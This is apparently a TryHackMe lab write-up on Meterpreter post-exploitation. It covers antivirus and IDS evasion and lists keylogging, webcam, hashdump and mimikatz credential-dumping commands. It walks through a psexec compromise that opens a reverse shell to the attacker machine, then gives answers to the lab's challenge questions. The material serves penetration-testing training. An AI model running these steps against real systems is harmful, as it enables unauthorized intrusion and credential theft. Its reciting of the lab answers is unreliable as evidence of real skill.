# Metasploit: Meterpreter
Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.

## Task 1 Introduction to Meterpreter
Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.

Meterpreter has many versions which will provide different functionalities based on the target system.

How does Meterpreter work?
Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.

Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.

While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.

The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the getpid command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).

**Getpid**
```bash
meterpreter > getpid 
Current pid: 1304
```

If we list processes running on the target system using the ps command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.

**The ps command**
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
```

Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)

**The Meterpreter process**
```bash
C:\Windows\system32>tasklist /m /fi "pid eq 1304"
tasklist /m /fi "pid eq 1304"

Image Name                     PID Modules                                     
========================= ======== ============================================
spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    
                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
                                   srvcli.dll, winspool.drv,                   
                                   PrintIsolationProxy.dll, FXSMON.DLL,        
                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
                                   webservices.dll, FirewallAPI.dll,           
                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
                                   winprint.dll, USERENV.dll, profapi.dll,     
                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
                                   cscapi.dll, netutils.dll, WININET.dll,      
                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
                                   webio.dll, SHELL32.dll, MPR.dll,            
                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
                                   pnrpnsp.dll, winrnr.dll                     

C:\Windows\system32>
```

Techniques and tools that can be used to detect Meterpreter are beyond the scope of this room. This section aimed to show you how stealthy Meterpreter is running; remember, most antivirus software will detect it.

It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.

## Task 2 Meterpreter Flavors
As previously discussed in the Metasploit rooms linked below, Metasploit payloads are broadly categorized into two types: inline (single) and staged payloads.

- Introduction
- Exploitation

Staged payloads are delivered in two phases. The initial component, known as the stager, is executed on the target system and is responsible for retrieving and executing the remaining part of the payload. This approach reduces the initial payload size, making it easier to deliver. In contrast, inline (or single) payloads contain the entire payload in one step, which simplifies the execution but increases the payload size.

Meterpreter payloads, which provide a powerful and extensible post-exploitation tool, are also available in both staged and inline formats. These payloads come in various versions tailored to different target environments.

To explore the available Meterpreter payloads, you can use the msfvenom tool. By executing the following command on the AttackBox, you can filter and list all available Meterpreter-related payloads:
```bash
msfvenom --list payloads | grep meterpreter
```
This command provides a quick overview of the different Meterpreter payloads supported, helping you select the most appropriate one based on the target system.

**Listing Meterpreter payloads**
```bash
root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker [...]
 ```

The list will show Meterpreter versions available for the following platforms:
- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

Your decision on which version of Meterpreter to use will be mostly based on three factors:
- The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.) 
 
If you are not using Meterpreter as a standalone payload generated by Msfvenom, your choice may also be limited by the exploit. You will notice some exploits will have a default Meterpreter payload, as you can see in the example below with the ms17_010_eternalblue exploit. 

**Default payload for MS17-010**
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can also list other available payloads using the show payloads command with any module. 
**Available payloads**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...]
```

## Task 3 Meterpreter Commands
 Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.

 **The Meterpreter help menu**
 ```bash
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]
```

Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.

Meterpreter will provide you with three primary categories of tools:
- Built-in commands
- Meterpreter tools
- Meterpreter scripting

If you run the help command, you will see Meterpreter commands are listed under different categories.

- Core commands
- File system commands
- Networking commands
- System commands
- User interface commands
- Webcam commands
- Audio output commands
- Elevate commands
- Password database commands
- Timestomp commands

Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.

### Meterpreter commands
Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

**Core commands:**
- **background:** Backgrounds the current session
- **exit:** Terminate the Meterpreter session
- **guid:** Get the session GUID (Globally Unique Identifier)
- **help:** Displays the help menu
- **info:** Displays information about a Post module
- **irb:** Opens an interactive Ruby shell on the current session
- **load:** Loads one or more Meterpreter extensions
- **migrate:** Allows you to migrate Meterpreter to another process
- **run:** Executes a Meterpreter script or Post module
- **sessions:** Quickly switch to another session

**File system commands:**
- **cd:** Will change directory
- **ls:** Will list files in the current directory (dir will also work)
- **pwd:** Prints the current working directory
- **edit:** will allow you to edit a file
- **cat:** Will show the contents of a file to the screen
- **rm:** Will delete the specified file
- **search:** Will search for files
- **upload:** Will upload a file or directory
- **download:** Will download a file or directory

**Networking commands:**
- **arp:** Displays the host ARP (Address Resolution Protocol) cache
- **ifconfig:** Displays network interfaces available on the target system
- **netstat:** Displays the network connections
- **portfwd:** Forwards a local port to a remote service
- **route:** Allows you to view and modify the routing table

**System commands:**
- **clearev:** Clears the event logs
- **execute:** Executes a command
- **getpid:** Shows the current process identifier
- **getuid:** Shows the user that Meterpreter is running as
- **kill:** Terminates a process
- **pkill:** Terminates processes by name
- **ps:** Lists running processes
- **reboot:** Reboots the remote computer
- **shell:** Drops into a system command shell
- **shutdown:** Shuts down the remote computer
- **sysinfo:** Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

- **idletime:** Returns the number of seconds the remote user has been idle
- **keyscan_dump:** Dumps the keystroke buffer
- **keyscan_start:** Starts capturing keystrokes
- **keyscan_stop:** Stops capturing keystrokes
- **screenshare:** Allows you to watch the remote user's desktop in real time
- **screenshot:** Grabs a screenshot of the interactive desktop
- **record_mic:** Records audio from the default microphone for X seconds
- **webcam_chat:** Starts a video chat
- **webcam_list:** Lists webcams
- **webcam_snap:** Takes a snapshot from the specified webcam
- **webcam_stream:** Plays a video stream from the specified webcam
- **getsystem:** Attempts to elevate your privilege to that of local system
- **hashdump:** Dumps the contents of the SAM database

Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.

## Task 4 Post-Exploitation with Meterpreter
Meterpreter provides you with many useful commands that facilitate the post-exploitation phase. Below are a few examples you will often use.

### Help

This command will give you a list of all available commands in Meterpreter. As we have seen earlier, Meterpreter has many versions, and each version may have different options available. Typing help once you have a Meterpreter session will help you quickly browse through available commands.

**The Meterpreter help menu**
```bash
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]
```

### Meterpreter commands
The getuid command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)

**The getuid command**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

The ps command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.
**The ps command**
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 764   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 828   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 864   828   WmiPrvSE.exe                                                       
 900   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 952   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1076  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1164  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1168  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 1244  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe[...]
```

### Migrate
Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.

To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716. 

**The migrate command**
```bash
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
meterpreter >
```

Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.

### Hashdump
The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

**The hashdump command**
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```

While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.

### Search
The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.

**The search command**
```bash
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```

### Shell
The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.

**The shell command**
```bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Task 5 Post-Exploitation Challenge
Start the AttackBox by pressing the Start AttackBox button at the top of this page. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue Show Split View button at the top of the page.

Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.

**Loading Python**
```bash
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!

meterpreter >
```

The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.

Gathering further information about the target system.
Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
Privilege escalation.
Lateral movement.
Once any additional tool is loaded using the load command, you will see new options on the help menu. The example below shows commands added for the Kiwi module (using the load kiwi command).

**Loading Kiwi**
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

These will change according to the loaded menu, so running the help command after loading a module is always a good idea.
**The updated help menu**
```bash
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.

You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

Username: ballen

Password: Password1

to get access the meterpreter

```bash
root@ip-10-10-2-3:~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: Open an interactive Ruby terminal with irb
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.4.55-dev-                         ]
+ -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]
+ -- --=[ 1616 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

search exploit/windows/smb/psexec
msf6 > search exploit/windows/smb/psexec

Matching Modules
================

   #  Name                        Disclosure Date  Rank    Check  Description
   -  ----                        ---------------  ----    -----  -----------
   0  exploit/windows/smb/psexec  1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   1    \_ target: Automatic      .                .       .      .
   2    \_ target: PowerShell     .                .       .      .
   3    \_ target: Native upload  .                .       .      .
   4    \_ target: MOF upload     .                .       .      .
   5    \_ target: Command        .                .       .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/psexec
After interacting with a module you can manually set a TARGET with set TARGET 'Command'

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   SERVICE_DESCRIPTI                   no        Service description to be use
   ON                                            d on target for pretty listin
                                                 g
   SERVICE_DISPLAY_N                   no        The service display name
   AME
   SERVICE_NAME                        no        The service name
   SMBSHARE                            no        The share to connect to, can
                                                 be an admin share (ADMIN$,C$,
                                                 ...) or a normal read/write f
                                                 older share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authent
                                         ication
   SMBPass                     no        The password for the specified userna
                                         me
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.2.3        yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > set rhosts 10.10.105.71
rhosts => 10.10.105.71
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.10.2.3:4444 
[*] 10.10.105.71:445 - Connecting to the server...
[*] 10.10.105.71:445 - Authenticating to 10.10.105.71:445 as user ''...
[-] 10.10.105.71:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.10.2.3:4444 
[*] 10.10.105.71:445 - Connecting to the server...
[*] 10.10.105.71:445 - Authenticating to 10.10.105.71:445 as user 'ballen'...
[*] 10.10.105.71:445 - Selecting PowerShell target
[*] 10.10.105.71:445 - Executing the payload...
[+] 10.10.105.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.105.71
[*] Meterpreter session 1 opened (10.10.2.3:4444 -> 10.10.105.71:59663) at 2025-05-26 22:57:45 +0100

meterpreter > 
```

### Question 1:
What is the computer name?

**Answer:** ACME-TEST

run sys info command to get the computer name

```bash
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > 
```

### Question 2:
What is the target domain?

**Answer:** FLASH

for this need to background meterpreter and search for this module post/windows/gather/enum_domain to gather information
```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > back
msf6 > search post/windows/gather/enum_domain

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  post/windows/gather/enum_domains             .                normal  No     Windows Gather Domain Enumeration
   1  post/windows/gather/enum_domain_users        .                normal  No     Windows Gather Enumerate Active Domain Users
   2  post/windows/gather/enum_domain              .                normal  No     Windows Gather Enumerate Domain
   3  post/windows/gather/enum_domain_group_users  .                normal  No     Windows Gather Enumerate Domain Group
   4  post/windows/gather/enum_domain_tokens       .                normal  No     Windows Gather Enumerate Domain Tokens


Interact with a module by name or index. For example info 4, use 4 or use post/windows/gather/enum_domain_tokens
```

set session then run
```bash
msf6 post(windows/gather/enum_domain) > show options

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_domain) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.2.3:4444 -> 10.10.105.71:53161 (10.10.105.71)

msf6 post(windows/gather/enum_domain) > set session 1
session => 1
msf6 post(windows/gather/enum_domain) > run
[+] Domain FQDN: FLASH.local
[+] Domain NetBIOS Name: FLASH
[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.105.71)
[*] Post module execution completed
msf6 post(windows/gather/enum_domain) > 
```

### Question 3:
What is the name of the share likely created by the user?

**Answer:** speedster

for this one you need to use this post/windows/gather/enum_shares 
```bash
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_shares) > session
```
set session and then run
```bash
msf6 post(windows/gather/enum_shares) > session -i
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 post(windows/gather/enum_shares) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.2.3:4444 -> 10.10.105.71:53161 (10.10.105.71)

msf6 post(windows/gather/enum_shares) > set session 1
session => 1
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.10.105.71)
[*] The following shares were found:
[*] 	Name: SYSVOL
